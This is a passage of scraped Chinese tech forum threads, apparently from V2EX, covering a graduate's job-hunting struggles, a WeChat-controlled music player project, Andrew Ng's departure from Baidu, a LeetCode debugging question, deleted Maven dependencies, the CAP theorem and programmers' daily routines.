竞赛经验。在技术这块和面试官都没啥聊的。</p>\n<p>在接下来的校招中，我发现招渗透测试的公司很少。即使有，相比起那些有丰富竞赛经验的同学，我的确是不够优秀，所以导致了零 offer 。我觉得还是自己太菜了。</p>\n<p>没有 offer ，大家都很着急。这个时候周围有同学去参加 Java 培训了，说是包就业那种。但是学费超级贵， 1.3W+。</p>\n<p>周围做 Java 的都找到工作了，虽然都是去培训的。我有点动摇，要不我也去培训下做 Java ？但是我觉得 Java 不难，犯不着去培训。更重要的是，培训费用对我而言，是很大一笔钱。</p>\n<p>后来我到知乎上提了个问，我不知道到底该坚持去做渗透，还是迫于就业压力去做开发。有人回答说要知道你是要成为牛逼的程序员的，这无关你是不是安全圈的。也有人说可以做一个懂安全的程序员。还有人说：你想要征服高山，就去当程序员，你想要征服大海，就去做安全。</p>\n<p>那段时间，就业压力和两难选择让我夜不能寐。把自己关在屋子里闷了一段时间学习 Java ，感觉自己像失恋似的。我给自己说做一个懂安全的程序员也不是坏事，闲暇之余依然可以关注安全技术。</p>\n<p>我在极客学院开了三个月 VIP ，结合慕课网开始啃 Java 。其实 Java 也没什么难的，过了一遍 JavaSE 基础就开始学习 Servlet,JSP,JDBC,C3P0 这些东西。然后就是 Spring ， SpringMVC ， Mybatis 这些东西。 SSH 框架也撸了一遍。学习过程基本上毫无压力，甚至还能指出视屏中不足的地方。例如实现万能 DAO 的时候采用字符串拼接会导致 SQL 注入，前端页面传过来的数据不做校检,以及富文本编辑器的内容不进行转义就往数据库存可能会导致存储型 XSS 漏洞。</p>\n<p>特别是理解了 MVC 的设计模式过后，自己实现了一遍 Controller 层的接收到前端传值自动封装为 POJO 类，返回字符串进行视图跳转，还有弄清楚 IoC 容器是如何实现装配 Bean 的。以及 ORM 是怎么做到把查询记录封装为对象的。还有 AOP 切面是怎么去切的，为什么可以实现切面。我觉得框架就那样，换汤不换药的感觉。有一次和培训班的同学交流，他们说框架部分是高级班的课程内容。对此真感到不解，框架存在的意义是为了简化开发流程，使用应该更简单才对，怎么变成了高级班的课程了。</p>\n<p>我觉得自己应该可以去找实习了。然后就去了省内某 985 高校去蹭校招。结果没想到被鄙视了。做完笔试题，现场递交简历， HR 看了眼我的简历，问我：你是从哪里知道我们要来招聘的？我说该校的就业网上有。然后她来一句：你们也可以进来？当时来不及多想，以《喜剧之王》中周星驰给霞姨打电话的语气回到：可以啊。 HR 冷哼了一声：没有其他事的话，你可以走了。我淡淡的回了声哦就离开了。当时真是百感交集。</p>\n<p>之后又去了一家公司的宣讲会。刚进门就要求签到。我看了下签到名单，我的学校写上去一定是最烂的。管他的，我还是厚着脸皮写了。宣讲会的时候感觉不对劲，负责人一个劲的介绍他们的 211 人才战略。最后的问答环节，我问贵司对学历的要求。负责人看了下签到名单，说：我们公司原则上是最低要求 211 ，但不是每条事业线都有这个要求。接下来就是现场笔试。我想来都来了，座一个多小时的车来不容易，好歹刷一波笔试题再走，然后又被鄙视。很远都能听到几个 HR 看着我这边在讨论我怎么还不走。难道我不配做贵司的笔试题么？笔试题只有两道题，并不难。考察的是 Java 字符串操作，基本上用 String 类提供的方法就能搞定，并不需要自己去扩展。我做完题，听到身后八点钟方向有两位同学在小声对答案。我扭过头去看了他们一眼，他们反应很大。直接来了句：垃圾，然后就立刻交卷走了。</p>\n<p>之后还参加了其他几场宣讲会。都是现场接收简历的，没有笔试，但一个泡都不冒一个。</p>\n<p>唉，感觉自己这个渣二本快没人要了。</p>\n</div></div>"], "reply": "1", "tittle": "感觉自己这个渣二本快没人要了", "comment": ["实话实说 鄙视链是有的 可能在补当年高中时欠下的债吧 不过 楼主自学能力不错的啊 像我这种自学前端入门到放弃的还比不上楼主呢 加油啊。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>#微信-网易云音乐播放器</p>\n<p>注意，该版本为电脑版(Windows/Linux/OSX)，如果需要使用树莓派，<a href=\"https://github.com/yaphone/RasWxNeteaseMusic\" rel=\"nofollow\">请点击这里</a>。</p>\n<h2>来源</h2>\n<p>之前毕业的时候实在闲的无聊，正好手头上有个树莓派，就写了个简单的网易云音乐播放器，代码很简单，写的也很乱，功能更简单--只能搜索歌曲，然后播放之，放在了 github 上，没想到竟然收到三十多颗星，实在惭愧，然后放年假，就想着把功能稍微完善一下，于是就有了<a href=\"https://github.com/yaphone/RasWxNeteaseMusic\" rel=\"nofollow\">WxNeteaseMusic</a>，其实做的工作也不多，基于<a href=\"https://github.com/littlecodersh/ItChat\" rel=\"nofollow\">itchat</a>和<a href=\"https://github.com/yaphone/NetEase-MusicBox\" rel=\"nofollow\">网易去音乐的 python API</a>，废话不多说，容我简单介绍一下吧。</p>\n<h2>安装</h2>\n<p>项目源码都都在<a href=\"https://github.com/yaphone/RasWxNeteaseMusic\" rel=\"nofollow\">我的 Github</a>上，大家先下载下来，麻烦大家顺手点个 star 哟~，谢谢。\n我们以 Ubuntu 环境为例，安装其实很简单，都是一些 python 的 pip 依赖包:</p>\n<ul>\n<li>sudo apt-get install python-dev</li>\n<li>sudo pip install requests</li>\n<li>sudo pip install future</li>\n<li>sudo pip install crypto</li>\n<li>sudo pip install bs4</li>\n<li>sudo pip install pycrypto</li>\n<li>sudo pip install mp3play</li>\n</ul>\n<p>上面这些依赖应该够了，如果提示缺少包的话，大家根据提示自行安装就可以了，切换到 WxNeteaseMusic 目录，执行 python <a href=\"http://run.py\" rel=\"nofollow\">run.py</a>\n用微信扫码登陆， Bingo, just enjoy it !</p>\n<h2>功能</h2>\n<p>嗯，先来看看都有什么功能。</p>\n<ul>\n<li>H: 帮助信息</li>\n<li>L: 登陆网易云音乐</li>\n<li>U: 用户歌单</li>\n<li>M: 播放列表</li>\n<li>N: 下一曲</li>\n<li>R: 正在播放</li>\n<li>S: 歌曲搜索</li>\n<li>T: 热门单曲</li>\n<li>G ：推荐歌单</li>\n<li>E: 退出</li>\n</ul>\n<p>这就是 WxNeteaseMusic V0.1 版的功能菜单啦，后面如果大家有其它的需求或者使用过程中有什么问题，都可以提出来， github 上提 Issue 或者在下面评论都可以，后面我会尽量完善。</p>\n<h2>使用</h2>\n<p>微信扫码登陆后，向登陆的微信号发送命令，就可以使用了。我的微信号是可以自己向自己发送信息的，使用起来比较方便，但是有些微信号好像不能自己给自己发信息，这种情况下，就需要通过另一个微信号向扫码登陆的微信号发命令。这里需要注意，扫码的时候 itchat 是以网页版 /电脑版的方式登陆微信的，如果扫码的手机退出微信客户端，那么 WxNeteaseMusic 自然也不能正常使用。不过也有手机退出微信但是网页版 /电脑版不退出的办法，大家自行百度一下。\n如果大家看一下代码就会发现， WxNeteaseMusic 是以空格为分隔符来切割命令的，所以对于有两个或者三个参数的命令时，需要以空格为分隔符，下面我具体来介绍一下。</p>\n<h3>获取帮助信息</h3>\n<p>发送 <code>H</code>。</p>\n<h3>登陆网易云音乐</h3>\n<p>命令格式为 <code>L 用户名 密码</code>，注意，<code>L</code>和<code>用户名</code>、<code>密码</code>之间以空格分开，这里的用户名和密码是你的网易云音乐的用户名和密码，邮箱格式。之后客户端会收到一条消息，登陆成功或者登陆失败，如果登陆成功， WxNeteaseMusic 会保存你的 UserId ，所以并不需要每次使用都要登陆账号，除非要换其它账号， UserId 在网易云音乐中是唯一的，用户的歌单、收藏列表等信息都是通过 UserId 来获取的。登陆成功后，就可以使用下面的功能了，默认是我的 UserId 哦，别忘记登录呀~</p>\n<h3>获取用户歌单</h3>\n<p>登陆成功后，播放列表默认为网易云音乐的热歌榜，些时发送<code>U</code>可以获取用户的歌单，就是你在网易云音乐创建的歌单，获取歌单后，通过命令<code>U 序号</code>来选择对应的歌单，注意<code>U</code>和<code>序号</code>之间有空格，此时播放列表是你歌单里的歌曲。</p>\n<h3>播放列表</h3>\n<p>使用过程中，发送<code>M</code>可以随时查看当时的播放列表。</p>\n<h3>下一曲</h3>\n<p>发送命令<code>N</code>来播放下一曲，<code>N 序号</code>播放列表中对应的歌曲，当前列表通过命令<code>M</code>获取。这里需要注意，通过<code>N 序号</code>选择列表中的歌曲时，播放是临时的，并不保存在播放列表中，此时再发<code>R</code>命令时显示的播放信息是错误的。</p>\n<h3>正在播放</h3>\n<p>发送命令<code>R</code>可获取正在播放的歌曲详情。</p>\n<h3>歌曲搜索</h3>\n<p>发送命令<code>S 歌曲名</code>可进行歌曲搜索，成功后会返回搜索结果列表，再发送<code>S 歌曲名 序号</code>来播放对应序号的歌曲，注意，两次命令的歌曲名必须完全一致。</p>\n<h3>热门单曲榜</h3>\n<p>发送<code>T</code>获取网易云音乐的热门单曲榜，并更新播放列表。</p>\n<h3>推荐歌单</h3>\n<p>发送<code>G</code>获取网易云音乐的热门单曲榜，并更新播放列表。</p>\n<h3>退出</h3>\n<p>发送<code>E</code>退出播放，此时播放列表变为空，用户如果要恢复播放，需要获取歌单更新播放列表。</p>\n<h2>功能演示</h2>\n<p>好吧好吧，说了这么多，还是让我来实际来演示一下吧。注意，演示中的登陆密码我已经修改了，你们就不要试了哈。</p>\n<p><img alt=\"演示\" src=\"http://oj5vdtyuu.bkt.clouddn.com/wxneteasemusic1.gif\"></p>\n<p>如果还不清楚的话，我还拍了个小视频，放在了优酷上，<a href=\"http://v.youku.com/v_show/id_XMjUxODk5MDQxNg==.html\" rel=\"nofollow\">请点击这里</a>。</p>\n<p><a href=\"http://v.youku.com/v_show/id_XMjUxODk5MDQxNg==.html?tpa=dW5pb25faWQ9MTAzMjUyXzEwMDAwMV8wMV8wMQ+\" rel=\"nofollow\"><img alt=\"视频演示\" src=\"http://oj5vdtyuu.bkt.clouddn.com/screenshot.png\"></a></p>\n</div></div>"], "reply": "18", "tittle": "通过微信控制电脑/树莓派播放网易云音乐", "comment": ["哈哈，看起来不错。\r", "\r", "不过我的情况是用屏幕坏掉的平板装上 Ubuntu Server's ，然后安装 Musicbox ", " 登录 SSH 来播放音乐。", "老实说 pi 还要接显示器的话总感觉不是很方便。\r", "我觉得用公共号可能更合适一点", "为什么不直接用手机版网易云音乐，连你视频中的蓝牙音响？", " #3 可能是为了省电（逃", " #2 可以用 VNC~", "这本质就是一个 WebAPI 的调用， 用了 python+ubuntu+单片机就变得高大上了？", "感觉不是什么很吊的东西啊", "我觉得做成 homekit 控制更好吧 ，不过 homekit 好像不能控制切歌加爱心这些。", "赞楼主。", " 瞧你这激动的，从行文来看，楼主哪里“高大上”了", " 谢谢😉", " 公众号功能确实多些，不过还要搞后台，这个用起来要简单些", " 我的场景是这样的，实验室是有一台电脑放音乐的，大家切歌就要跑到那里操作，比较麻烦，后来我就想做个后台，用微信来操作切歌这些，这样大家只要加了我的微信号，发相关指令就可以了，还是比较方便的。再后来，电脑换成了树莓派，我就又移植到了树莓派上。不过这里吐槽一下，树莓派的原生音质确实渣，我们后来买了个 DAC ，完美。😁", " @", " 我的场景是这样的，实验室是有一台电脑放音乐的，大家切歌就要跑到那里操作，比较麻烦，后来我就想做个后台，用微信来操作切歌这些，这样大家只要加了我的微信号，发相关指令就可以了，还是比较方便的。再后来，电脑换成了树莓派，我就又移植到了树莓派上。不过这里吐槽一下，树莓派的原生音质确实渣，我们后来买了个 DAC ，完美。😄", "感谢楼主,一个非常好玩的项目.", "谢谢楼主，好玩~音乐播放 ing...", " 嗯，本质应该是电子的相互作用哈，一点都不高大上🙃", " #14 嗯 是树莓派的 DAC 扩展板吗？"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://tech.ifeng.com/a/20170322/44559400_0.shtml\" rel=\"nofollow\">http://tech.ifeng.com/a/20170322/44559400_0.shtml</a>\r<br>\r<br>百度人工智能团队变动 首席科学家吴恩达宣布离职\r<br>2017 年 03 月 22 日 12:08:58 \r<br>来源：凤凰科技 作者：白杨 \r<br>\r<br>0 人参与 0 评论\r<br>\r<br>\r<br>百度首席科学家吴恩达\r<br>\r<br>凤凰科技讯（作者 /白杨） 3 月 22 日，百度首席科学家吴恩达（ Andrew Ng ）在英文自媒体平台 Medium 及微博、 Twitter 等个人社交平台发布公开信，宣布自己将从百度离职，开启自己在人工智能领域的新篇章。在公开信中，吴恩达赞赏李彦宏为“全球人工智能领域最优秀的 CEO ”。\r<br>\r<br>随后，百度通过其企业官方微博对吴恩达离职的消息予以确认。官微中，百度转发了吴恩达宣布离职的公开信，并表示“ Andrew 加入百度是因为我们对人工智能的未来有着共同美好的追求，即使今天分别，但百川归海，我们仍有着一致的目标，那就是推动人工智能技术的发展，让未来生活更加美好。虽有遗憾，但更多的是感谢和祝福！祝愿 Andrew 未来取得更大成就，一切顺利！”\r<br>\r<br>吴恩达是人工智能和机器学习领域国际上最权威的学者之一。他于 2014 年 5 月加入百度，担任百度公司首席科学家，也是百度人工智能的负责人，负责百度研究院的领导工作，尤其是 Baidu Brain 计划。在他的带领下，百度在人工智能领域取得了长足的发展。\r<br>\r<br>“作为百度人工智能战略的首席架构师，我很自豪能够引领公司在人工智能方面飞速发展和崛起。”公开信中，吴恩达介绍称，目前百度人工智能团队已经增长到近 1300 人，其中包括 300 名百度研究院成员。人工智能技术每天服务上亿用户，全面支持搜索，广告，地图，外卖，安全，消费金融等百度现有业务，并孵化出了无人驾驶、 DuerOS 语音交互、人脸识别等多项由人工智能驱动的新业务、新技术。\r<br>\r<br>吴恩达指出，百度是目前为数不多的在人工智能的各个重要领域都拥有世界级专家专业水准的公司，这些领域包括语音、自然语言处理、计算机视觉、机器学习、知识图谱等诸多方面。能够带领百度人工智能团队，能够跟百度卓越的管理者、非凡的工程师、科学家、产品经理等优秀的团队共事，自己也深感荣幸。\r<br>\r<br>吴恩达称，“李彦宏是第一位高瞻远瞩，清晰看到深度学习技术巨大价值的大公司 CEO ，也是全球人工智能领域最优秀的 CEO 之一。首席运营官陆奇是位资深的企业管理者，同时在人工智能领域拥有丰富的经验，在他的领导下，百度的人工智能将继续开花结果。 AI 技术平台体系新任总负责人王海峰是一位出色的研究学者和技术领袖。在他的有力领导下，百度的 AI 团队定会有更好的未来发展。我们的新任百度研究院院长林元庆，是位出色的技术和业务带头人，将会提升百度人工智能技术，创造更多业务成果。”\r<br>\r<br>据介绍，离开百度之后，吴恩达将继续致力于人工智能事业，通过人工智能改变社会，使人们的生活更加美好。\r<br>\r<br>“正如百年前电电能改变的了很多行业一样，人工智能也正在改变着医疗、交通、娱乐、制造业等主要行业，丰富充实着无数人的生活。对于人工智能将带领我们前往何方，我比以往都要兴奋和期待。”他补充称，除了致力于人工智能本身之外，自己也将探索新的方式来帮助全球人工智能的爱好者，“让我们可以一起将用人工智能赋能整个社会，取得更多成果。”\r<br>\r<br>以下为吴恩达公开信原文：\r<br>\r<br>开启我在人工智能领域的新篇章\r<br>\r<br>亲爱的朋友们：\r<br>\r<br>我即将辞去在百度的工作，告别我一直带领的人工智能团队。百度的人工智能实力强大，团队内上上下下都有非常优秀的人才，所以，我坚信百度的人工智能将会一如既往蓬勃发展。离开百度之后，我也很高兴将继续致力于人工智能事业，通过人工智能改变社会，使人们的生活更加美好。\r<br>\r<br>百度的人工智能\r<br>\r<br>我在 2014 年加入百度，负责人工智能工作。到现在，百度的人工智能团队已经增长到近 1300 人，其中包括 300 名百度研究院成员。上亿的用户每天都在使用我们的人工智能软件。我们通过许许多多人工智能产品项目支持我们的搜索、广告、地图、外卖、语音搜索、安全、消费金融等等现有业务，提升产品，拉动收入。\r<br>\r<br>我们也运用人工智能开拓新业务。我的团队在过去的两年中，每年都孵化出一项新业务：一项是无人驾驶，另一项是 DuerOS 语音交互计算平台。我们也正在孵化一些非常有前景的技术，比如人脸识别（当已注册用户走近应用人脸识别技术的闸门时，闸门会自动开启），美乐医（医疗领域的人工智能对话交互机器人）等等。作为百度人工智能战略的首席架构师，我很自豪能够引领公司在人工智能方面飞速发展和崛起。\r<br>\r<br>百度是目前为数不多的在人工智能各个重要领域都拥有世界级专业水准的公司，这些领域包括语音、自然语言处理、计算机视觉、机器学习、知识图谱等诸多方面。能够带领百度人工智能团队，能够跟百度卓越的管理者、非凡的工程师、科学家、产品经理等等百度优秀的团队共事，我深感荣幸。李彦宏是第一位高瞻远瞩，清晰看到深度学习技术巨大价值的大公司 CEO ，也是全球人工智能领域最优秀的 CEO 之一。首席运营官陆奇是位资深的企业管理者，同时在人工智能领域拥有丰富的经验，在他的领导下，百度的人工智能将继续开花结果。 AI 技术平台体系新任总负责人王海峰是一位出色的研究学者和技术领袖。在他的有力领导下，百度的 AI 团队定会有更好的未来发展。我们的新任百度研究院院长林元庆，是位出色的技术和业务带头人，将会提升百度人工智能技术，创造更多业务成果。在他们的有力领导下，在 Adam Coates 、景鲲、李平、徐伟、朱凯华等人工智能顶尖人才的努力下，百度的人工智能将继续开拓前行，我也会为此而欢欣喝彩。\r<br>\r<br>我很荣幸能够从两大人工智能强国，中国、美国的人工智能界都学习过。美国擅长创造新的技术和理念，而中国擅于将人工智能技术用于开发出好的产品。我很高兴自己能够有机会既为中国也为美国的人工智能发展崛起作出努力和贡献。\r<br>\r<br>人工智能是新电能\r<br>\r<br>正如百年前电能改变了很多行业一样，人工智能也正在改变着医疗、交通、娱乐、制造业等主要行业，丰富充实着无数人的生活。对于人工智能将带领我们前往何方，我比以往都要兴奋和期待。\r<br>\r<br>作为谷歌大脑计划的创始人，以及百度人工智能的负责人，我在这两家顶尖的技术公司向“人工智能公司”转型中都发挥了作用。但是人工智能的潜力远远超越了对科技公司的影响。\r<br>\r<br>\r<br>我将继续致力于用人工智能引领这场重大的社会变革。除了推动大公司使用人工智能，也还有很多创业，以及更深入进行人工智能研究的机会。我希望我们每个人都拥有自动驾驶汽车，每个人都拥有可以自如进行语音对话交互的计算机，每个人都拥有可以诊断我们病痛的医疗机器人。工业革命将人类从重复性体力劳动中解放出来；现在我希望人工智能可以将人类从重复性脑力劳动，比如忙乱的交通驾驶中，解放出来。这项工作不是任何一家公司可以独立完成的，这是全世界的人工智能研究者和工程师的共同课题。我在 Coursera 上的机器学习 MOOC 课程曾帮助很多人进入人工智能这个领域。除了致力于人工智能本身之外，我也将探索新的方式来帮助全球人工智能的爱好者，让我们一起用人工智能赋能整个社会，取得更多成果。\r<br>\r<br>我们将利用人工智能创造美好未来，对此我从未如此乐观。让我们一起为推动人工智能，帮助每一个人而努力！\r<br>\r<br>Andrew Ng(吴恩达)</div>"], "reply": "2", "tittle": "百度人工智能团队变动 首席科学家吴恩达宣布离职", "comment": ["最强大脑，不还人机对战么， Ng 还参加了\r", "\r", "美乐医（医疗领域的人工智能对话交互机器人），这个走偏了，他还没意识到人的主诉是多么不靠谱，尤其是看了百度感觉自己得了绝症一样，实际上绝大多数时间抽个血扎个手指就能搞定。。", " 虽然不靠谱，但是能忽悠钱啊。 管你问什么，都推荐医院做检查。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>每天例行补充营养,结果发现 502 了...</p>\n<p><a href=\"https://juejin.im\" rel=\"nofollow\">https://juejin.im</a></p>\n</div></div>"], "reply": "8", "tittle": "稀土掘金 502 了..", "comment": ["官方微博说在维护", "估计用的青云。。。", "目测青云 SegmentFault 也挂了", "还以为有车可以上，点开发现真是补充营养", "目前正在逐步恢复中，还需要一点时间~", " 是的", "1 个小时了还没好啊", "难怪今天 sf 也挂了"]},
{"content": "", "reply": "9", "tittle": "开发难度调查： ", "comment": ["每个国家开发者=>每个国家的开发者\r", "这题目好大", "自然之友的网站被科学上网了啊！！！", "我看了这个感觉设计好 SB ，简直不知道要问什么，不知道怎么回答。", " 好吧，你认真。", " 所以，是谁 SB ？", " 可以吧： ", " 没必要这样吧，愿意参与就参与，不愿意就算了", " 可以了，看到你的 logo 想起了大学时参与的各种环保组织，还有经常去的济溪论坛、自然之友网站，以及想起了 2010 年梁从诫先生逝世时我们参加过的各种纪念活动", " 感谢，欢迎继续支持自然之友。 ：）"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://aphyr.com/posts/340-acing-the-technical-interview\" rel=\"nofollow\">《 Acing the technical interview 》</a>，老外写的白板面试的调侃文，声色并茂，兼具叙述文的生动与技术文的抽象。</p>\n<p>我尝试翻译了下，但文中个别语句我翻译的不是很好或者没有翻译，希望感兴趣的读者予以补充。</p>\n<ul>\n<li><a href=\"http://liujiacai.net/blog/2017/03/22/ace-technical-interview/\" rel=\"nofollow\">http://liujiacai.net/blog/2017/03/22/ace-technical-interview/</a></li>\n</ul>\n</div></div>"], "reply": "1", "tittle": "英文技术文章翻译求助《“玩转” 技术面试——链表的函数表示法》", "comment": ["你的头像是 sicp 封面，很有灵性"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT</p>\n<p>都准备去看哪些好玩的东西\n推荐一下</p>\n</div></div>"], "reply": "4", "tittle": "有过几天去 MWC2017 的嘛", "comment": ["巴塞罗那展吗？我只知道巴展有一大堆运营商和设备商，说着很高大上的计划。实际上很多展示都是只有前端的动画。", "HALL 1, 1D44", "我只想知道 sony 有什么新产品", "回来了...很无聊...\r", "巴萨的海鲜很好吃..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这几天碰到两次线上有 case 通不过，但是相同的 case 在本地上却能给出正确的结果，本地和线上的代码一样。\n比如这道题\n<a href=\"https://leetcode.com/problems/spiral-matrix/?tab=Description\" rel=\"nofollow\">https://leetcode.com/problems/spiral-matrix/?tab=Description</a></p>\n<p>代码有点丑如下：</p>\n<pre><code>import java.util.*;\npublic class Solution {\n    public static List&lt;Integer&gt; spiralOrder(int[][] matrix) {\n        if (matrix == null || matrix.length == 0)\n            return new LinkedList&lt;Integer&gt;();\n\n        int m = matrix.length;\n        int n = matrix[0].length;\n\n        int left = 0;\n        int right = n-1;\n        int top = 0;\n        int bottom = m-1;\n        List&lt;Integer&gt; spiral = new LinkedList&lt;&gt;();\n        int k = 0;\n        while (k &lt; m*n) {\n            int i = top;\n            int j = left;\n            for (; j &lt;= right; j++) {\n                spiral.add(matrix[i][j]);\n                k++;\n            }\n            i++; j--;\n            for (; i &lt;= bottom; i++) {\n                spiral.add(matrix[i][j]);\n                k++;\n            }\n\n            i--; j--;\n            for (; j &gt;= left; j--) {\n                spiral.add(matrix[i][j]);\n                k++;\n            }\n\n            i--; j++;\n\n            for (; i &gt; top; i--) {\n                spiral.add(matrix[i][j]);\n                k++;\n            }\n\n            top++;\n            left++;\n            bottom--;\n            right--;\n        }\n        return spiral;\n\n    }\n\n    public static void main(String[] args) {\n        int[][] mat = {\n            {2},\n            {3}\n        };\n\n        List&lt;Integer&gt; spiral = spiralOrder(mat);\n        for (Integer num: spiral)\n            System.out.printf(\"%d \", num);\n        System.out.println();\n\n    }\n}\n\n\n[[2,3]] 这个 case 本地得到是[2,3]。\n\n\nleetcode 给的结果是\n\nInput: [[2,3]]\n\nOutput:[2,3,2]\n\nExpected:[2,3]\n</code></pre>\n</div></div>"], "reply": "11", "tittle": "大家在 OJ 上做题的时候，有没有碰到过这样的情况？求各位大大指点，挺急的", "comment": ["消灭零回复", "求各路大神指点，困惑很久了", "要不大家本地测试下，代码可以直接跑，谢谢各位大大", "你这有啥奇怪的，一两个 case 正确能保证所有 case 都正确？", "打 cf 遇到过类似的...原因大概是一些函数忘记返回值或者某些变量忘记初始化之类的...", "你的代码有问题。另外 [2,3] 不是 {{2},{3}} 而是 {{2,3}}.\r", "你的代码转第四次的时候回到了 2 ，所以最后多了个 2", "额。。。还有一种情况就是解法是一次性的，改变了测试样例（比方说二叉树）的结构，那么也会出现这种问题，不过有的 oj 会报 runtime error 然后就什么都没有了\r", " 多谢，我的锅", "这再正常不过了， oj 比你的 case 更全", " 嗯， leetcode 貌似这样是会 RE 的", "这种写法最后返回结果要返回结果里面的前 0 到 n-1 个，不然会多几个，因为你的 while loop 是做完四次再判断。最后一次 loop ，多算一行或者一列。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>例如，一个引用了多年的第三方项目。</p>\n<p>突然有一天，作者把它删了。</p>\n<p>然后你的项目编译不过了。咋办。</p>\n<p>是不是要跪了？？？？</p>\n</div></div>"], "reply": "15", "tittle": "maven 或者 jcenter，项目作者把库删了，怎么办。", "comment": ["所以 npm 去掉了 unpublish", "联系作者，给钱。或者在本地缓存，各大镜像里面找。实在不行从发布的包里面挖出来。然后上传到内部的 Nexus 服务器.", "npm 超过一天的 repo 都不能 unpublish", "私服，自己维护", "让我想起了 bower (/´Д｀)/", "npm 有过类似的事件，一个流行库的作者故意删除了自己的项目，影响了好多人。因为这 npm 都修改了机制", "私服或者 classpath 依赖", "fork 一份自己维护一份呗。不需要省这点空间。", "想不出来为什么删", "已经发布的是没法删的", " 要删除还必须发邮件", "Maven central repository 不允许删除吧", "central repo 能删除吗？\r", "\r", "我比较担心的 go ，是不是一个 github 上面的库删了一些依赖就挂了，以前 npm 就发生过这种事情。", "搭私服啊，下一个", "自己搭建一个 nexus 私服，然后把第三方的 jar 传上去自己维护"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>摘自博客：</p>\n<blockquote>\n<p>在某时候如果满足 AP ，分割的节点同时对外服务但不能互相通信，将不能满足 C （即状态不一致）</p>\n</blockquote>\n<p>为什么分割的节点同时对外服务但不能互相通信？求解</p>\n</div></div>"], "reply": "6", "tittle": "分布式 CAP 理论的一个问题请教", "comment": ["应该是指因为节点分割带来的数据同步延时导致的一致性不满足吧？", " 所以要同时满足 CA ，就能出现网络分区是吗", " #2 “就”和“能”之间添加“不”", " 按照 cap 理论来说是这样的", "可以设想一下，假设出现了分区（ P ），就是你的服务器被分成了两个部分，每个部分内部可以通讯，也都可以分别对外服务，但两个部分之间不能通讯。这个时候你就必须做出一个选择：\r", "\r", "1. 要么保证可用性（ A ），继续允许读写操作，但因为两个部分无法同步数据，所以会出现不同步（ C ）\r", "2. 或者保证一致性（ C ），拒绝写入操作，直到两个部分恢复再允许写入，但这样就会出现服务不可用（ A ）\r", "\r", "或者如果你可用性和一致性都需要的话，那你就无法满足分区容错性。", "网络分区"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>西二旗的程序员们的日常都是怎么样的\n如果说起程序员的聚集地是哪里，很多人可能会立刻想到“中关村”这个地方。在北京工作的小伙伴们都知道，其实呢，除了中关村，地铁十三号线上基本都是程序员们的天下：从西二旗到上地、宇宙中心五道口、知春路、再到中关村。\n自从去年百度科技园陆陆续续搬进去一些公司后，西二旗便成了新的程序员地标地。有个段子曾经这样描述西二旗的重要地位：</p>\n<p>问：什么能造成互联网大震动？</p>\n<p>网友答： 13 号线停运</p>\n<p>问：那制约中国互联网未来十年发展最大的瓶颈是什么？</p>\n<p>网友答：后厂村路</p>\n<p>当然，这里所说的后厂村路便是同向西二旗众多公司的重要通道。那么西二旗的程序员们的日常都是怎么样的呢，我们就需要从这条后厂村路开始说起了。\n首先，除去你每天早上醒来洗漱，赶到楼下买个煎饼果子吃完早饭（强烈建议先吃早饭去上班，因为你可能会在路上堵很久，如果你不想早饭变为午饭的话）然后就开始的一天新的开始，在后场村路堵他个半小时。这时候你会感谢早上去买了早饭吃，手机冲满了电。\n这半小时内，你可以闭着眼睛在休息半小时，或者思考半小时昨晚没有解决的 Bug 问题。然后在不知不觉堵了半小时后，终于到达了公司。开始了一天的工作时间。\n正常的程序员工作大概都是这样子的\n9:30AM 到公司（正常的公司）</p>\n<p>9:30~10:00AM ，收邮件，看新闻，看微博。\n10:00~11:30AM 写代码。</p>\n<p>11:30~12:00AM 被产品烦，被运营烦，开会讨论中发呆</p>\n<p>12:00~1:30PM ， outing 午饭；</p>\n<p>1:30~2:00PM ，看新闻，看微博。</p>\n<p>2:00~5:30PM ，听歌写代码。</p>\n<p>5:30~6:00PM ，吃晚饭。之后的时间，看新闻，看微博，写代码（加班）</p>\n<p>7:00~9 ： 30PM ，加班回家</p>\n<p>所以说为什么程序员们都是常常加班的呢，因为可能白天的时间没有太多的时间集中精力来写代码。\n补充一个架构师版本的：收邮件，开会，开会，技术讨论，开会，开会，开会，晚饭，写代码，回家。这里不写时间，毕竟开会没啥太大限定的时间…</p>\n<p>然后熬夜到晚上一两点睡，不要问我为什么这里不讲他们做什么。谁知道大半夜不睡觉在干什么，明明头发就掉的够少的了，猝死率高发的也是够多的了。不睡觉的依旧是不睡觉。</p>\n<p>然后我们来细细的说一下在西二旗的程序员，</p>\n<p>在后厂村路堵车堵到九点半，慢悠悠的走到公司坐到工位打开电脑十点。心情好的冲一杯速溶咖啡听个歌开始刷微博，然后打开电脑收到邮件后通知十分钟后开始开会，开完会写一小会代码开始吃午饭，午饭后去“风景宜人”科技园逛一逛，可能遇到自己在别家公司工作的同学打个招呼，</p>\n<p>“嗨，一会儿来我们篮球场打球啊”\n“我们这边的网球场也建好了，来打网球啊”</p>\n<p>互相炫耀一下后各自回公司，然后下午码代码，吃完晚饭去楼下健身房溜达一圈，因为人太多根本占不到健身器材，然后默默的回到公司打一小会游戏，跟产品撕一会儿然后等到他们下班后，开始加班码代码。</p>\n<p>抬起头看看手表，九点半了叫个滴滴打车回家…所以总结起来呢，他们的日常大致是这样的（模仿其内心 os 